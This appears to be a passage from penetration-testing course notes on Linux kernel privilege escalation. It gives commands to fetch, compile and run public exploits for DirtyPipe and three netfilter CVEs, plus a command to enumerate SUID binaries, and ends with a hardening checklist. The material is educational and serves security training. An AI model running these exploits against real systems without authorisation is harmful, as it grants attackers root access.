    cry0l1t3@nix02:~$ git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
    cry0l1t3@nix02:~$ cd CVE-2022-0847-DirtyPipe-Exploits
    cry0l1t3@nix02:~$ bash compile.sh

After compiling the code, we have two different exploits available. The first exploit version (exploit-1) modifies the /etc/passwd and gives us a prompt with root privileges. For this, we need to verify the kernel version and then execute the exploit.

    uname -r 
    ./exploit-1

With the help of the 2nd exploit version (exploit-2), we can execute SUID binaries with root privileges. However, before we can do that, we first need to find these SUID binaries. For this, we can use the following command:

    find / -perm -4000 2>/dev/null
    ./exploit-2 /usr/bin/sudo

## Netfilter
Netfilter is a Linux kernel module that provides, among other things, packet filtering, network address translation, and other tools relevant to firewalls. It controls and regulates network traffic by manipulating individual packets based on their characteristics and rules.

This kernel module has three main functions:

- Packet defragmentation
- Connection tracking
- Network address translation (NAT)

In 2021 (CVE-2021-22555), 2022 (CVE-2022-1015), and also in 2023 (CVE-2023-32233), several vulnerabilities were found that could lead to privilege escalation.

CVE-2021-22555
Vulnerable kernel versions: 2.6 - 5.11

    cry0l1t3@ubuntu:~$ wget https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
    cry0l1t3@ubuntu:~$ gcc -m32 -static exploit.c -o exploit
    cry0l1t3@ubuntu:~$ ./exploit

CVE-2022-25636
A recent vulnerability is CVE-2022-25636 and affects Linux kernel 5.4 through 5.6.10. This is net/netfilter/nf_dup_netdev.c

    cry0l1t3@ubuntu:~$ git clone https://github.com/Bonfee/CVE-2022-25636.git
    cry0l1t3@ubuntu:~$ cd CVE-2022-25636
    cry0l1t3@ubuntu:~$ make
    cry0l1t3@ubuntu:~$ ./exploit

CVE-2023-32233
This vulnerability exploits the so called anonymous sets in nf_tables by using the Use-After-Free vulnerability in the Linux Kernel up to version 6.3.1.

    cry0l1t3@ubuntu:~$ git clone https://github.com/Liuk3r/CVE-2023-32233
    cry0l1t3@ubuntu:~$ cd CVE-2023-32233
    cry0l1t3@ubuntu:~/CVE-2023-32233$ gcc -Wall -o exploit exploit.c -lmnl -lnftnl
    ./exploit


# Linux Hardening

**1. Updates and Patching**

**2. Configuration Management**
- Audit writable files and directories and any binaries set with the SUID bit.
- Ensure that any cron jobs and sudo privileges specify any binaries using the absolute path.
- Do not store credentials in cleartext in world-readable files.
- Clean up home directories and bash history.
- Ensure that low-privileged users cannot modify any custom libraries called by programs.
- Remove any unnecessary packages and services that potentially increase the attack surface.
- Consider implementing SELinux, which provides additional access controls on the system.

**3. User Management**
Templates exist for configuration management automation tools such as Puppet, SaltStack, Zabbix and Nagios to automate such checks and can be used to push messages to a Slack channel or email box as well as via other methods.

**4. Audit**
tool https://github.com/CISOfy/lynis